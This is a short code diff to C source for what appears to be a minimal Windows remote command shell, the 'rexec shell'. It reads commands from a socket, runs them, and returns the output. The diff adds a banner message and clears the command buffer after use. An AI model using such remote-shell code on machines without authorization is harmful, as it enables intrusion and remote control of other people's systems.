@@ -271,6 +271,7 @@ int start() {
   Buf out;
   SecureZeroMemory(&out, sizeof(out));
   DWORD code = 0;
+  sendQ(sock, "Minial rexec shell.\rThere are no terminal key handling capabilities.\n");
   while (running) {
     if (n == 0) {
       GetCurrentDirectoryA(sizeof(path), path);
@@ -288,6 +289,7 @@ int start() {
     buf[n] = '\0';
     if (buf[n - 1] != '\n')
       continue;
+
     if (CALL(strncmp)(buf, "quit", 4) == 0 || CALL(strncmp)(buf, "exit", 4) == 0) {
       running = 0;
       break;
@@ -328,6 +330,7 @@ int start() {
       n = 0;
     } else
       sendQ(sock, "Could not start the process.\n\n");
+    SecureZeroMemory(&cmd, sizeof(cmd));
   }
 
   shutdown(sock, SD_BOTH);
